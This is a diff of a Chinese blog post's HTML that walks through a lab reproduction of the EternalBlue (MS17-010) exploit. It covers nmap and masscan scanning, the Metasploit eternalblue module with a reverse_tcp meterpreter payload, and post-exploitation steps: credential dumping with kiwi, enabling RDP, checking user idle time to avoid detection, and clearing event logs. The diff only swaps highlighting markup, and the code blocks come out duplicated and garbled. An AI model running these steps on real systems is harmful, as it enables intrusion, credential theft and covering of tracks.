@@ -356,7 +356,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    971
+                    957
                 </div>
                 
 
@@ -445,28 +445,28 @@
 <p>![](<a target="_blank" rel="noopener" href="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111556.png">https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111556.png</a></p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111583.png"></p>
 <p>二、在kali上用nmap扫描局域网内主机</p>
-<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">nmap -sP 192.168.1.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight lua">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>/<span class="number"><code class="language-highlight lua">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span>/<span class="number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>发现被攻击机</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141618780.png"></p>
 <p>三、扫描端口查看其运行的服务</p>
-<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">nmap -p 1-65535 -A 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight lua">nmap -p <span class="number">1</span><span class="number">-65535</span> -A <span class="number">192.168</span><span class="number">.1</span><span class="number"><code class="language-highlight lua">nmap -p <span class="number">1</span><span class="number">-65535</span> -A <span class="number">192.168</span><span class="number">.1</span><span class="number">.18</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141620919.png"></p>
-<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">masscan --rate&#x3D;10000 -p1-65535 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight lua">masscan <span class="comment"><code class="language-highlight lua">masscan <span class="comment">--rate=10000 -p1-65535 192.168.1.18</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141616556.png"></p>
 <p>发现445端口  正是永恒之蓝利用的便是445端口中的SMB服务获取系统的最高权限</p>
 <p>四、进行漏洞扫描</p>
-<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">nmap --script&#x3D;vuln 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight lua">nmap <span class="comment"><code class="language-highlight lua">nmap <span class="comment">--script=vuln 192.168.1.18</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141625140.png"></p>
 <p>扫描的漏洞中包括<strong>MS17-010漏洞</strong></p>
 <p>五、进入MSF控制台</p>
-<pre class="line-numbers language-kali" data-language="kali"><code class="language-kali">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight kali"><code class="language-highlight kali">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>寻找我们刚才扫描到的 <strong>MS17-010漏洞</strong></p>
-<pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">search ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight msf"><code class="language-highlight msf">search ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141628161.png"></p>
 <p>在其中</p>
@@ -474,62 +474,62 @@
 <p>0代表着永恒之蓝攻击模块，用于攻击目标用户，</p>
 <p>数字需要自己判断你自己的攻击模块在哪，每个人都不一样</p>
 <p>加载扫描模块</p>
-<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">use 3   
-use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010       &#x2F;&#x2F;俩者皆可，输入一个就行
-
-show options    &#x2F;&#x2F;查看该模块所需的参数配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-highlight ruby">use <span class="number"><code class="language-highlight ruby">use <span class="number">3</span>   
+use auxiliary/scanner/smb/smb_ms17_010       /<span class="regexp">/俩者皆可，输入一个就行</span>
+<span class="regexp"></span>
+<span class="regexp">show options    /</span><span class="regexp">/查看该模块所需的参数配置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141633575.png"></p>
 <p>发现其RHOSTS尚未配置</p>
 <p>设置攻击目标的ip</p>
-<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">set rhosts 192.168.1.18
+<pre class="line-numbers language-highlight ruby">set rhosts <span class="number">192.168</span>.<span class="number"><code class="language-highlight ruby">set rhosts <span class="number">192.168</span>.<span class="number">1.18</span>
 设置后执行扫描
-run           &#x2F;&#x2F;进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+run           /<span class="regexp">/进行扫描</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141635700.png"></p>
 <p>说明可以进行攻击，但是我们上面其实已经扫过该目标靶机里面有永恒之蓝漏洞</p>
 <p>六、使用攻击模块</p>
-<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">use 0    
-use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue    &#x2F;&#x2F;使用一个即可
-show options    
-set rhosts 192.168.1.18   &#x2F;&#x2F;设置目标主机ip
-set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;设置payload
-set lhost 192.168.1.17   &#x2F;&#x2F;设置攻击机ip 
-run  或  exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-highlight ruby">use <span class="number"><code class="language-highlight ruby">use <span class="number">0</span>    
+use exploit/windows/smb/ms17_010_eternalblue    /<span class="regexp">/使用一个即可</span>
+<span class="regexp">show options    </span>
+<span class="regexp">set rhosts 192.168.1.18   /</span><span class="regexp">/设置目标主机ip</span>
+<span class="regexp">set payload windows/x</span>64/meterpreter/reverse_tcp  /<span class="regexp">/设置payload</span>
+<span class="regexp">set lhost 192.168.1.17   /</span><span class="regexp">/设置攻击机ip </span>
+<span class="regexp">run  或  exploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141644517.png"></p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141646012.png"></p>
 <p>运行成功会出现meterpreter控制台，并在结尾处出现 WIN  这时候我们就已经拿到权限并且可以使用</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141649007.png"></p>
-<h3 id="演示功能"><a href="#演示功能" class="headerlink" title="演示功能"></a>演示功能</h3><h4 id="一、屏幕截取"><a href="#一、屏幕截取" class="headerlink" title="一、屏幕截取"></a>一、屏幕截取</h4><pre class="line-numbers language-none"><code class="language-none">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="演示功能"><a href="#演示功能" class="headerlink" title="演示功能"></a>演示功能</h3><h4 id="一、屏幕截取"><a href="#一、屏幕截取" class="headerlink" title="一、屏幕截取"></a>一、屏幕截取</h4><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141654891.png"></p>
 <h4 id="二、上传-x2F-下载文件"><a href="#二、上传-x2F-下载文件" class="headerlink" title="二、上传&#x2F;下载文件"></a>二、上传&#x2F;下载文件</h4><p>上传文件</p>
-<pre class="line-numbers language-none"><code class="language-none">upload 1.txt c:&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">upload 1.txt c://<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141656746.png"></p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141657662.png"></p>
 <p>下载文件</p>
-<pre class="line-numbers language-none"><code class="language-none">download c:&#x2F;&#x2F;2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">download c://2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141706192.png"></p>
 <h4 id="三、获取CMD"><a href="#三、获取CMD" class="headerlink" title="三、获取CMD"></a>三、获取CMD</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141712539.png"></p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141713076.png"></p>
-<h4 id="四、获取用户密码"><a href="#四、获取用户密码" class="headerlink" title="四、获取用户密码"></a>四、获取用户密码</h4><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="四、获取用户密码"><a href="#四、获取用户密码" class="headerlink" title="四、获取用户密码"></a>四、获取用户密码</h4><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141715113.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">creds_all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">creds_all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141716805.png"></p>
 <p>启用远程桌面</p>
-<pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">run post/windows/manage/enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141717749.png"></p>
 <p>查看用户空闲时间，以防将其顶掉被发现</p>
-<pre class="line-numbers language-none"><code class="language-none">idletime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">idletime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后调到kali的管理员终端</p>
-<pre class="line-numbers language-none"><code class="language-none">rdesktop 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">rdesktop 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141725948.png"></p>
 <p>原账户被顶掉，当然也可以利用自己提权然后自己新创一个用户登录</p>
@@ -537,7 +537,7 @@ run  或  exploit<span aria-hidden="true" class="line-numbers-rows"><span></span
 <h4 id="五、清理日志"><a href="#五、清理日志" class="headerlink" title="五、清理日志"></a>五、清理日志</h4><p>清理前</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141729848.png"></p>
 <p>清理后</p>
-<pre class="line-numbers language-none"><code class="language-none">clearev        &#x2F;&#x2F;在meterpreter上<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">clearev        //在meterpreter上<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141730360.png"></p>
 <h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上就是我对永恒之蓝的复现</p>
